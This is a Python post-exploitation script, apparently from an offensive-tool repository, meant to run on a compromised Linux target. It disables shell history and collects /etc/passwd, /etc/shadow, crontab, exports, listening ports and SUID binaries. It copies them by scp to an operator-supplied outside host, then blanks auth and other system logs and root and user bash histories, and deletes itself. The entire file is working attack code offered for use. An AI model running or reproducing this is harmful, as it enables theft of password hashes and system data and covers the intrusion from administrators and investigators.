#!/usr/bin/python3
# author: suffs811 
# Copyright (c) 2023 suffs811
# https://github.com/suffs811/the-terminator.git
# read the README.md file for more details; software distributed under MIT license
#
# python script for catting /etc files, saving them to file,
# sending them to local system,
# and deleting history/script from target machine.
# 
# usage: python3 exfil.py -i <your_ip:/path_to_save_file> -u '<your_username>'


import os
import platform
import argparse


# get arguments for IP and password
parser = argparse.ArgumentParser(description="gather data, scp to local device, cover tracks\nusage: python3 exfil.py -i <local_ip:/local_path> -u '<your_username>'")
parser.add_argument("-i", "--ip", help="specify 'local IP:/path' to scp (secure copy) data file to", required="True")
parser.add_argument("-u", "--username", help="specify local (your) username for scp", required="True")
args = parser.parse_args()
local_path = args.ip 
username = args.username


# check if user password known fo sudo -l cmd
def user_pass():
    print("#############################################")
    bool_pass = input("+++ do you know the user's password? (y/n): ")
    return bool_pass


def extract_clear(local_path,username):
    # confirm user wants to permanently delete logs and alter bach environment variables
    print("\n### this script will permanently delete logs and alter bash environment variables... ###")
    answer = input("\n+++ are you sure you want to gather system data and export it to local machine? (yes/no): ")

    if answer == "no":
        exit()
    elif answer == "yes":
        # disable history logging
        print("\ndisabling history logging...")
        os.system("unset HISTFILE")
        os.system("export HISTSIZE=0")
        os.system("export HISTFILESIZE=0")
        os.system("export HISTFILE=/dev/null")
        os.system("set +o history")

        # create file to write data to
        os.system("touch /tmp/data_exfil.txt")

        # write data to file
        print("### exfiltrating data... ###")

        print("\n### system info (not writing to file): ###")
        my_system = platform.uname()
        print("system: {}".format(my_system.system))
        print("node name: {}".format(my_system.node))
        print("release: {}".format(my_system.release))
        print("version: {}".format(my_system.version))
        print("machine: {}".format(my_system.machine))
        print("processor: {}".format(my_system.processor))

        # get system info and write to data file
        print("")
        os.system("id > /tmp/data_exfil.txt")
        os.system("whoami > /tmp/data_exfil.txt")
        os.system("netstat -tnpl > /tmp/data_exfil.txt")
        os.system("id")
        os.system("whoami")
        os.system("netstat -tnpl")

        print("\n### /etc/passwd: ###")
        os.system("cat /etc/passwd >> /tmp/data_exfil.txt")
        os.system("cat /etc/passwd")

        print("\n### /etc/shadow: ###")
        os.system("cat /etc/shadow >> /tmp/data_exfil.txt")
        os.system("cat /etc/shadow")

        print("\n### /etc/hosts: ###")
        os.system("cat /etc/hosts")
        os.system("cat /etc/hosts")

        print("\n### /etc/crontab: ###")
        os.system("cat /etc/crontab >> /tmp/data_exfil.txt")
        os.system("cat /etc/crontab")

        print("\n### /etc/exports: ###")
        os.system("cat /etc/exports >> /tmp/data_exfil.txt")
        os.system("cat /etc/exports")

        print("\n### SUID files: ###")
        os.system("find / type -f perm /4000 2>/dev/null >> /tmp/data_exfil.txt")
        os.system("find / type -f perm /4000 2>/dev/null")

        # exfil the data file to local machine
        print("\n### sending data to {}@{}... ###\n+input your local machine user's password+".format(username,local_path))
        os.system("timeout -k 10 10 scp /tmp/data_exfil.txt {}@{}".format(username,local_path))
        print("\n### data_exfil.txt sent to {} ###".format(local_path))
        return
    else:
        print("\n*** didn't enter 'y' or 'n'!!! ***")
        extract_clear()


# detect if pwd was given as option, if so, run sudo -l
def sudo_l(bool_pass):

    if bool_pass == "y":
        print("\n### enter user's password to run sudo-l (you have 10 seconds): ###")
        # trouble finding a way to run sudo -l bc it requires password input
        os.system("timeout -k 10 10 sudo -l")
        #os.system("sudo -S -l < <(echo '{}')".format(password))
    elif bool_pass == "n":
        print("\n### skipping sudo -l, user's password not known... ###")
    else:
        print("\n*** didn't enter 'y' or 'n'!!! ***")
        user_pass()



# ask to clear logs and delete script from local machine
def delete_file():
    answer_2 = input("\n+++ do you want to delete the logs and this script? (yes/no): ")
    if answer_2 == "no":
        print("good luck!")
        return
    elif answer_2 == "yes":
        # delete logs and this script from target machine
        print("\n### clearing log files ###")
        os.system("echo ' ' > /var/log/auth.log")
        os.system("echo ' ' > /var/log/cron.log")
        os.system("echo ' ' > /var/log/maillog")
        os.system("echo ' ' > /var/log/httpd")
        os.system("history -c")
        os.system("history -w")
        os.system("echo ' ' > ~/.bash_history")
        os.system("echo ' ' > /root/.bash_history")

        print("\n### deleting data file and script... ###")
        os.system("rm -f /tmp/data_exfil.txt")
        os.system("rm -f exfil.py")
        return
    else:
        print("didn't write yes or no!!!")
        delete_file()

# call functions
user_pass ()
extract_clear(local_path,username)
sudo_l(bool_pass)
delete_file()
